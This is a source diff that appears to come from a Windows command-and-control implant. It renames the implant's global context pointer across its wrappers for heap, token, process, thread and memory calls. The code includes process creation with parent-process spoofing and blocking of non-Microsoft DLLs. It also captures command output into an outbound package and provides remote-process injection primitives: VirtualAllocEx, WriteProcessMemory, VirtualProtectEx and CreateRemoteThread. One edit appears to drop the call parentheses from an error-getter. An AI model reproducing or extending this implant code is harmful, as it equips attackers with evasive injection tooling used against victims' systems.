@@ -5,20 +5,20 @@ using namespace Root;
 auto DECLFN Library::Load(
     _In_ PCHAR LibName
 ) -> UPTR {
-    return (UPTR)Kh->Krnl32.LoadLibraryA( LibName );
+    return (UPTR)Self->Krnl32.LoadLibraryA( LibName );
 }
 
 auto DECLFN Heap::Alloc(
     _In_ ULONG Size
 ) -> PVOID {
-    return Kh->Ntdll.RtlAllocateHeap( C_PTR( Kh->Session.HeapHandle ), HEAP_ZERO_MEMORY, Size );
+    return Self->Ntdll.RtlAllocateHeap( C_PTR( Self->Session.HeapHandle ), HEAP_ZERO_MEMORY, Size );
 }
 
 auto DECLFN Heap::ReAlloc(
     _In_ PVOID Block,
     _In_ ULONG Size
 ) -> PVOID {
-    return Kh->Ntdll.RtlReAllocateHeap( C_PTR( Kh->Session.HeapHandle ), HEAP_ZERO_MEMORY, Block, Size );
+    return Self->Ntdll.RtlReAllocateHeap( C_PTR( Self->Session.HeapHandle ), HEAP_ZERO_MEMORY, Block, Size );
 }
 
 auto DECLFN Heap::Free(
@@ -26,7 +26,7 @@ auto DECLFN Heap::Free(
 	_In_ ULONG Size
 ) -> BOOL {
     Mem::Zero( U_PTR( Block ), Size );
-    return Kh->Ntdll.RtlFreeHeap( C_PTR( Kh->Session.HeapHandle ), 0, Block );
+    return Self->Ntdll.RtlFreeHeap( C_PTR( Self->Session.HeapHandle ), 0, Block );
 }
 
 auto DECLFN Token::GetUser( 
@@ -45,34 +45,34 @@ auto DECLFN Token::GetUser(
     ULONG        UserLen      = 0;
     BOOL         bSuccess     = FALSE;
 
-    NtStatus = Kh->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, NULL, 0, &ReturnLen );
+    NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, NULL, 0, &ReturnLen );
     if ( NtStatus != STATUS_BUFFER_TOO_SMALL ) {
         goto _KH_END;
     }
 
-    TokenUserPtr = ( PTOKEN_USER )Kh->Hp->Alloc( ReturnLen );
+    TokenUserPtr = ( PTOKEN_USER )Self->Hp->Alloc( ReturnLen );
     if ( !TokenUserPtr ) {
         goto _KH_END;
     }
 
-    NtStatus = Kh->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, TokenUserPtr, ReturnLen, &ReturnLen );
+    NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, TokenUserPtr, ReturnLen, &ReturnLen );
     if ( !NT_SUCCESS( NtStatus ) ) { goto _KH_END; }
 
-    bSuccess = Kh->Advapi32.LookupAccountSidA( 
+    bSuccess = Self->Advapi32.LookupAccountSidA( 
         NULL, TokenUserPtr->User.Sid, NULL,
         &UserLen, NULL, &DomainLen, &SidName 
     );
 
-    if ( !bSuccess && KhGetError() == ERROR_INSUFFICIENT_BUFFER ) {
+    if ( !bSuccess && KhGetError == ERROR_INSUFFICIENT_BUFFER ) {
         TotalLen = UserLen + DomainLen + 2; 
 
-        *UserNamePtr = ( PCHAR )Kh->Hp->Alloc( TotalLen ); 
+        *UserNamePtr = ( PCHAR )Self->Hp->Alloc( TotalLen ); 
         if ( !*UserNamePtr ) { goto _KH_END; }
 
         DomainStr = *UserNamePtr;
         UserStr   = (*UserNamePtr) + DomainLen;
 
-        bSuccess = Kh->Advapi32.LookupAccountSidA( 
+        bSuccess = Self->Advapi32.LookupAccountSidA( 
             NULL, TokenUserPtr->User.Sid, UserStr,
             &UserLen, DomainStr, &DomainLen, &SidName 
         );
@@ -80,7 +80,7 @@ auto DECLFN Token::GetUser(
         if ( bSuccess ) {
             (*UserNamePtr)[DomainLen] = '\\';
         } else {
-            Kh->Hp->Free( *UserNamePtr, TotalLen );
+            Self->Hp->Free( *UserNamePtr, TotalLen );
             *UserNamePtr = NULL;
             *UserNameLen = 0;
         }
@@ -88,7 +88,7 @@ auto DECLFN Token::GetUser(
 
 _KH_END:
     if ( TokenUserPtr ) {
-        Kh->Hp->Free( TokenUserPtr, ReturnLen );
+        Self->Hp->Free( TokenUserPtr, ReturnLen );
     }
     return bSuccess;
 }
@@ -98,7 +98,7 @@ auto DECLFN Token::ProcOpen(
     _In_ ULONG   RightsAccess,
     _In_ PHANDLE TokenHandle
 ) -> BOOL {
-    return Kh->Advapi32.OpenProcessToken( ProcessHandle, RightsAccess, TokenHandle );
+    return Self->Advapi32.OpenProcessToken( ProcessHandle, RightsAccess, TokenHandle );
 }
 
 auto DECLFN Process::Open(
@@ -106,11 +106,10 @@ auto DECLFN Process::Open(
     _In_ BOOL  InheritHandle,
     _In_ ULONG ProcessID
 ) -> HANDLE {
-    return Kh->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
+    return Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
 }
 
 auto DECLFN Process::Create(
-    _In_  PPACKAGE             Package,
     _In_  PCHAR                CommandLine,
     _In_  ULONG                PsFlags,
     _Out_ PPROCESS_INFORMATION PsInfo
@@ -128,8 +127,8 @@ auto DECLFN Process::Create(
     STARTUPINFOEXA      SiEx         = { 0 };
     SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
 
-    if ( Kh->Ps->Ctx.BlockDlls ) { UpdateCount++; }
-    if ( Kh->Ps->Ctx.ParentID  ) { UpdateCount++; };
+    if ( Self->Ps->Ctx.BlockDlls ) { UpdateCount++; }
+    if ( Self->Ps->Ctx.ParentID  ) { UpdateCount++; };
 
     SiEx.StartupInfo.cb          = sizeof( STARTUPINFOEXA );
     SiEx.StartupInfo.dwFlags     = EXTENDED_STARTUPINFO_PRESENT;
@@ -137,75 +136,71 @@ auto DECLFN Process::Create(
 
     PsFlags |= CREATE_NO_WINDOW;
 
-    if ( Kh->Ps->Ctx.Pipe ) {
-        Success = Kh->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, PIPE_BUFFER_LENGTH );
+    if ( Self->Ps->Ctx.Pipe ) {
+        Success = Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, PIPE_BUFFER_LENGTH );
         if ( !Success ) { goto _KH_END; }
 
-        Kh->Krnl32.SetHandleInformation( PipeWrite, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT );
+        Self->Krnl32.SetHandleInformation( PipeWrite, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT );
 
         SiEx.StartupInfo.hStdError  = PipeWrite;
         SiEx.StartupInfo.hStdOutput = PipeWrite;
-        SiEx.StartupInfo.hStdInput  = Kh->Krnl32.GetStdHandle( STD_INPUT_HANDLE );
+        SiEx.StartupInfo.hStdInput  = Self->Krnl32.GetStdHandle( STD_INPUT_HANDLE );
         SiEx.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
     }
 
     if ( UpdateCount           ) ProcAttr.Initialize( UpdateCount );
-    if ( Kh->Ps->Ctx.ParentID  ) ProcAttr.UpdateParentSpf( Process::Open( PROCESS_ALL_ACCESS, TRUE, Kh->Ps->Ctx.ParentID ) );
-    if ( Kh->Ps->Ctx.BlockDlls ) ProcAttr.UpdateBlockDlls();
+    if ( Self->Ps->Ctx.ParentID  ) ProcAttr.UpdateParentSpf( Process::Open( PROCESS_ALL_ACCESS, TRUE, Self->Ps->Ctx.ParentID ) );
+    if ( Self->Ps->Ctx.BlockDlls ) ProcAttr.UpdateBlockDlls();
 
-    if ( Kh->Ps->Ctx.ParentID || Kh->Ps->Ctx.BlockDlls ) SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ProcAttr.GetAttrBuff();
+    if ( Self->Ps->Ctx.ParentID || Self->Ps->Ctx.BlockDlls ) SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ProcAttr.GetAttrBuff();
 
-    Success = Kh->Krnl32.CreateProcessA( 
+    Success = Self->Krnl32.CreateProcessA( 
         NULL, CommandLine, NULL, NULL, TRUE, PsFlags, 
-        NULL, Kh->Ps->Ctx.CurrentDir, &SiEx.StartupInfo, PsInfo
+        NULL, Self->Ps->Ctx.CurrentDir, &SiEx.StartupInfo, PsInfo
     );
     if ( !Success ) { goto _KH_END; }
 
-    if ( Kh->Ps->Ctx.Pipe ) {
+    if ( Self->Ps->Ctx.Pipe ) {
         
-        Kh->Ntdll.NtClose( PipeWrite ); PipeWrite = NULL;
+        Self->Ntdll.NtClose( PipeWrite ); PipeWrite = NULL;
 
-        DWORD waitResult = Kh->Krnl32.WaitForSingleObject( PsInfo->hProcess, 1000 );
+        DWORD waitResult = Self->Krnl32.WaitForSingleObject( PsInfo->hProcess, 1000 );
 
         if (waitResult == WAIT_TIMEOUT) {
             KhDbg( "Timeout waiting for process output" );
         }
 
-        Success = Kh->Krnl32.PeekNamedPipe( 
+        Success = Self->Krnl32.PeekNamedPipe( 
             PipeRead, NULL, 0, NULL, &PipeBuffSize, NULL           
         );
         
         if ( !Success ) { goto _KH_END; }
 
         if ( PipeBuffSize > 0 ) {
-            PipeBuff = (PBYTE)Kh->Hp->Alloc( PipeBuffSize );
+            PipeBuff = (PBYTE)Self->Hp->Alloc( PipeBuffSize );
             if ( !PipeBuff ) { goto _KH_END; }
         
-            Success = Kh->Krnl32.ReadFile( 
+            Success = Self->Krnl32.ReadFile( 
                 PipeRead, PipeBuff, PipeBuffSize, &TmpValue, NULL 
             );
-            if ( !Success ) { goto _KH_END;
-            }
+            if ( !Success ) { goto _KH_END; }
         
-            if ( Package ) {
-                Kh->Pkg->AddBytes( Package, PipeBuff, TmpValue );
-            }
+            Self->Pkg->Bytes( GLOBAL_PKG, PipeBuff, TmpValue );
+            
         } else {
             KhDbg( "No data available in pipe" );
         }
     }
  
 _KH_END:
-    if ( PipeBuff  ) Kh->Hp->Free( PipeBuff, PipeBuffSize );
-    if ( PipeWrite ) Kh->Ntdll.NtClose( PipeWrite );
-    if ( PipeRead  ) Kh->Ntdll.NtClose( PipeRead );
+    if ( PipeBuff  ) Self->Hp->Free( PipeBuff, PipeBuffSize );
+    if ( PipeWrite ) Self->Ntdll.NtClose( PipeWrite );
+    if ( PipeRead  ) Self->Ntdll.NtClose( PipeRead );
 
     return Success;
 }
 
-auto DECLFN Thread::RndEnum( 
-    VOID
-) -> ULONG {
+auto DECLFN Thread::RndEnum( VOID ) -> ULONG {
     PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
     PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
     PVOID                       ValToFree     = NULL;
@@ -215,22 +210,22 @@ auto DECLFN Thread::RndEnum(
     ULONG                       ThreadID      = 0;
     BOOL                        bkSuccess     = FALSE;
 
-    Kh->Ntdll.NtQuerySystemInformation( SystemProcessInformation, NULL, NULL, &ReturnLen );
+    Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, NULL, NULL, &ReturnLen );
 
-    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)Kh->Hp->Alloc( ReturnLen );
+    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)Self->Hp->Alloc( ReturnLen );
     ValToFree   = SysProcInfo;
 
-    bkErrorCode = Kh->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
+    bkErrorCode = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
     if ( bkErrorCode ) goto _KH_END;
 
     SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
 
     while( 1 ) {
-        if ( SysProcInfo->UniqueProcessId == UlongToHandle( Kh->Session.ProcessID ) ) {
+        if ( SysProcInfo->UniqueProcessId == UlongToHandle( Self->Session.ProcessID ) ) {
             SysThreadInfo = SysProcInfo->Threads;
 
             for ( INT i = 0; i < SysProcInfo->NumberOfThreads; i++ ) {
-                if ( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) != Kh->Session.ThreadID ) {
+                if ( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) != Self->Session.ThreadID ) {
                     ThreadID = HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ); goto _KH_END;
                 }
             }
@@ -240,7 +235,7 @@ auto DECLFN Thread::RndEnum(
     }
 
 _KH_END:
-    if ( SysProcInfo ) Kh->Hp->Free( ValToFree, sizeof( SYSTEM_PROCESS_INFORMATION ) );
+    if ( SysProcInfo ) Self->Hp->Free( ValToFree, sizeof( SYSTEM_PROCESS_INFORMATION ) );
 
     return ThreadID;
 }
@@ -254,9 +249,9 @@ auto DECLFN Thread::Create(
     _Out_ PULONG ThreadID
 ) -> HANDLE {
     if ( ProcessHandle ) {
-        return Kh->Krnl32.CreateRemoteThread( ProcessHandle, 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
+        return Self->Krnl32.CreateRemoteThread( ProcessHandle, 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
     } else {
-        return Kh->Krnl32.CreateThread( 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
+        return Self->Krnl32.CreateThread( 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, C_PTR( Parameter ), Flags, ThreadID );
     }
 }
 
@@ -265,7 +260,7 @@ auto DECLFN Thread::Open(
     _In_ BOOL  Inherit,
     _In_ ULONG ThreadID
 ) -> HANDLE {
-    return Kh->Krnl32.OpenThread( RightAccess, Inherit, ThreadID );
+    return Self->Krnl32.OpenThread( RightAccess, Inherit, ThreadID );
 }
 
 auto DECLFN Memory::Alloc(
@@ -276,9 +271,9 @@ auto DECLFN Memory::Alloc(
     _In_ ULONG Protect
 ) -> PVOID {
     if ( !Handle ) {
-        return Kh->Krnl32.VirtualAlloc( Base, Size, AllocType, Protect );
+        return Self->Krnl32.VirtualAlloc( Base, Size, AllocType, Protect );
     } else {
-        return Kh->Krnl32.VirtualAllocEx( Handle, Base, Size, AllocType, Protect );
+        return Self->Krnl32.VirtualAllocEx( Handle, Base, Size, AllocType, Protect );
     }
 }
 
@@ -290,9 +285,9 @@ auto DECLFN Memory::Protect(
     _Out_ PULONG OldProt
 ) -> BOOL {
     if ( !Handle ) {
-        return Kh->Krnl32.VirtualProtect( Base, Size, NewProt, OldProt );
+        return Self->Krnl32.VirtualProtect( Base, Size, NewProt, OldProt );
     } else {
-        return Kh->Krnl32.VirtualProtectEx( Handle, Base, Size, NewProt, OldProt );
+        return Self->Krnl32.VirtualProtectEx( Handle, Base, Size, NewProt, OldProt );
     }
 }
 
@@ -304,7 +299,7 @@ auto DECLFN Memory::Write(
 ) -> BOOL {
     ULONG_PTR Written = 0;
 
-    return Kh->Krnl32.WriteProcessMemory( Handle, Base, Buffer, Size, &Written );
+    return Self->Krnl32.WriteProcessMemory( Handle, Base, Buffer, Size, &Written );
 }
 
 auto DECLFN Memory::Free(
@@ -314,9 +309,9 @@ auto DECLFN Memory::Free(
     _In_ ULONG  FreeType
 ) -> BOOL {
     if ( !Handle ) {
-        return Kh->Krnl32.VirtualFree( Base, Size, FreeType );
+        return Self->Krnl32.VirtualFree( Base, Size, FreeType );
     } else {
-        return Kh->Krnl32.VirtualFreeEx( Handle, Base, Size, FreeType );
+        return Self->Krnl32.VirtualFreeEx( Handle, Base, Size, FreeType );
     }
 }
  
